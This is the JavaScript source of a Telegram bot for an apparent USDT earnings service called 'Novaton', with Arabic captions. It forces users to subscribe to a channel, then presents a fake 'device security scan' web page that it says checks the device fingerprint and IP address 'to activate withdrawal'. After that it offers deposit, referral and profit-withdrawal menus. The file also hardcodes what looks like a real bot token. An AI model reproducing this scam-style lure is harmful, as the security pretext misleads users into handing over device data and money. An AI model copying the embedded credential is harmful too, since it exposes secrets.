const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const path = require('path');

const BOT_TOKEN = '8685057163:AAGT3o3Ad-MAYfrHQmxRkA6Py6pnKPnUzMk';
const ADMIN_ID = 1683002116;
const CHANNEL_ID = '@VaultoUSDT'; // قناتك
const bot = new Telegraf(BOT_TOKEN);
const app = express();

app.use(express.static(path.join(__dirname)));
app.get('/validate', (req, res) => res.sendFile(path.join(__dirname, 'validate.html')));
app.listen(process.env.PORT || 10000);

// دالة فحص الاشتراك الإجباري
async function checkSubscription(ctx) {
    try {
        const member = await ctx.telegram.getChatMember(CHANNEL_ID, ctx.from.id);
        return ['member', 'administrator', 'creator'].includes(member.status);
    } catch (e) { return false; }
}

bot.start(async (ctx) => {
    const isSub = await checkSubscription(ctx);
    
    // المرحلة الأولى: إذا لم يشترك تظهر صورة القنوات والتحقق
    if (!isSub) {
        return ctx.replyWithPhoto("https://image2url.com/r2/default/images/1774806219411-7438bf59-86d5-4352-9d9a-dd254c3f841d.jpg", {
            caption: `⚠️ **عذراً! يجب عليك الاشتراك أولاً**\n\nلكي نتمكن من حماية حسابك وفحص جهازك، يرجى الانضمام للقنوات أدناه ثم اضغط على زر "التحقق".`,
            ...Markup.inlineKeyboard([
                [Markup.button.url("📢 القناة الرسمية", "https://t.me/VaultoUSDT")],
                [Markup.button.callback("✅ التحقق من الاشتراك", "verify_sub")]
            ])
        });
    }

    // المرحلة الثانية: إذا اشترك تظهر واجهة الحماية (Web App)
    showProtectionButton(ctx);
});

// معالجة ضغطة زر التحقق من الاشتراك
bot.action('verify_sub', async (ctx) => {
    const isSub = await checkSubscription(ctx);
    if (isSub) {
        await ctx.answerCbQuery("✅ تم تأكيد الاشتراك!");
        await ctx.deleteMessage();
        showProtectionButton(ctx);
    } else {
        await ctx.answerCbQuery("❌ لم تشترك في القناة بعد!", { show_alert: true });
    }
});

function showProtectionButton(ctx) {
    const domain = process.env.RENDER_EXTERNAL_HOSTNAME || 'novaton-bot.onrender.com';
    const webAppUrl = `https://${domain}/validate`;

    ctx.replyWithPhoto("https://image2url.com/r2/default/images/1774806219411-7438bf59-86d5-4352-9d9a-dd254c3f841d.jpg", {
        caption: `🛡️ **نظام الحماية نشط**\n\nأهلاً بك. اضغط على الزر أدناه لبدء فحص بصمة الجهاز والـ IP الخاص بك لتفعيل السحب.`,
        ...Markup.inlineKeyboard([
            [Markup.button.webApp("🔍 فحص أمان الجهاز والدخول", webAppUrl)]
        ])
    });
}

// استقبال بيانات الحماية (بعد انتهاء الـ Web App)
bot.on('web_app_data', (ctx) => {
    ctx.reply("🚀 **تم التحقق!** أهلاً بك في واجهة Novaton.", Markup.keyboard([
        ["👤 حسابي", "🔗 الإحالة"],
        ["📥 إيداع", "📤 سحب الأرباح"]
    ]).resize());
});

// لوحة الإدارة
bot.command('admin', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.reply("👑 **لوحة الإدارة**", Markup.inlineKeyboard([
        [Markup.button.callback("📢 إذاعة", "cast"), Markup.button.callback("🚫 حظر", "ban")]
    ]));
});

bot.launch();
